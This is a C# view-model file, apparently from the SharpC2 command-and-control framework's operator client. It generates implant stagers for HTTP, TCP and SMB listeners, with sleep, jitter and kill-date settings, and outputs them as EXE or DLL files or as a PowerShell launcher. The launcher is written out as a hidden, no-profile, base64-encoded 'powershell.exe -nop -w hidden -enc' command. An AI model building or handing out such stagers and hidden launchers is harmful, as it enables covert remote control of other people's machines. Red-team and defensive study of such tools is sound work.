using Client.Models;
using Client.SharpC2API;
using Client.Views;

using Microsoft.Win32;
using SharpC2.Listeners;
using SharpC2.Models;

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;

namespace Client.ViewModels
{
    class GeneratePayloadViewModel : BaseViewModel
    {
        private GeneratePayloadView View { get; set; }
        public List<string> ListenerList { get; set; } = new List<string>();
        public List<Listener> Listeners { get; set; } = new List<Listener>();
        public ContentControl PayloadType { get; set; } = new ContentControl();
        public string SleepInterval { get; set; } = "60";
        public string SleepJitter { get; set; } = "25";
        public DateTime KillDate { get; set; } = DateTime.UtcNow.AddDays(365);
        public List<string> Formats { get; set; } = new List<string> { "PowerShell", "Windows .NET EXE", "Windows .NET DLL" };
        public List<string> Frameworks { get; set; } = new List<string> { ".NET Framework 4" };

        private string _selectedListener;
        public string SelectedListener
        {
            get { return _selectedListener; }
            set { _selectedListener = value; UpdateSelectedPayloadView(); }
        }

        public string SelectedFramework { get; set; }
        public string SelectedFormat { get; set; }

        private readonly DelegateCommand _generatePayload;
        public ICommand GeneratePayload => _generatePayload;

        public GeneratePayloadViewModel(GeneratePayloadView view)
        {
            View = view;
            _generatePayload = new DelegateCommand(OnGeneratePayload);

            GetListeners();
        }

        private async void GetListeners()
        {
            var listeners = await ListenerAPI.GetAllListeners();

            foreach (var listener in listeners)
            {
                Listeners.Add(new Listener { ListenerName = listener.ListenerName, ListenerGuid = listener.ListenerGuid, ListenerType = listener.Type });
                ListenerList.Add(string.Format("{0} : {1}", listener.ListenerName, listener.Type));
            }
        }

        private async void OnGeneratePayload(object obj)
        {
            var listener = Listeners.FirstOrDefault(l => l.ListenerName.Equals(SelectedListener.Split(":")[0].TrimEnd(), StringComparison.OrdinalIgnoreCase));

            var req = new PayloadRequest();

            switch (listener.ListenerType)
            {
                case ListenerType.HTTP:
                    req = new HttpPayloadRequest { ListenerGuid = listener.ListenerGuid, SleepInterval = SleepInterval, SleepJitter = SleepJitter };
                    break;
                case ListenerType.TCP:
                    req = new TcpPayloadRequest { ListenerGuid = listener.ListenerGuid };
                    break;
                case ListenerType.SMB:
                    req = new SmbPayloadRequest { ListenerGuid = listener.ListenerGuid };
                    break;
            }

            req.KillDate = KillDate;

            if (SelectedFormat.Equals("PowerShell", StringComparison.OrdinalIgnoreCase) || SelectedFormat.Contains("EXE", StringComparison.OrdinalIgnoreCase))
            {
                req.OutputType = OutputType.Exe;
            }

            var window = new Window
            {
                Height = 100,
                Width = 360,
                WindowStartupLocation = WindowStartupLocation.CenterOwner,
                Content = new ProgressBarView { DataContext = new ProgressBarViewModel { Label = "Building..."} }
            };

            window.Show();

            var payload = new byte[] { };

            switch (listener.ListenerType)
            {
                case ListenerType.HTTP:
                    payload = await PayloadAPI.GenerateHttpStager(req as HttpPayloadRequest);
                    break;
                case ListenerType.TCP:
                    payload = await PayloadAPI.GenerateTcpStager(req as TcpPayloadRequest);
                    break;
                case ListenerType.SMB:
                    payload = await PayloadAPI.GenerateSmbStager(req as SmbPayloadRequest);
                    break;
            }

            window.Close();

            if (payload.Length > 0)
            {
                if (SelectedFormat.Equals("PowerShell", StringComparison.OrdinalIgnoreCase))
                {
                    var launcher = PowerShellLauncher.GenerateLauncher(payload);
                    var encLauncher = Convert.ToBase64String(Encoding.Unicode.GetBytes(launcher));

                    var powerShellPayloadViewModel = new PowerShellPayloadViewModel
                    {
                        Launcher = $"powershell.exe -nop -w hidden -c \"{launcher}\"",
                        EncLauncher = $@"powershell.exe -nop -w hidden -enc {encLauncher}",
                    };

                    var powerShellPayloadView = new PowerShellPayloadView
                    {
                        DataContext = powerShellPayloadViewModel
                    };

                    powerShellPayloadView.Show();
                }
                else
                {
                    var save = new SaveFileDialog();

                    if (SelectedFormat.Contains("EXE", StringComparison.OrdinalIgnoreCase))
                    {
                        save.Filter = "EXE (*.exe)|*.exe";
                    }
                    else if (SelectedFormat.Contains("DLL", StringComparison.OrdinalIgnoreCase))
                    {
                        save.Filter = "DLL (*.dll)|*.dll";
                    }

                    if ((bool)save.ShowDialog())
                    {
                        File.WriteAllBytes(save.FileName, payload);
                    }
                }
            }

            View.Close();
        }

        private void UpdateSelectedPayloadView()
        {
            object content = null;

            if (SelectedListener.Equals(ListenerList[0]))
            {
                content = new GenerateHttpPayloadView
                {
                    DataContext = this
                };
            }

            PayloadType.Content = content;
        }
    }
}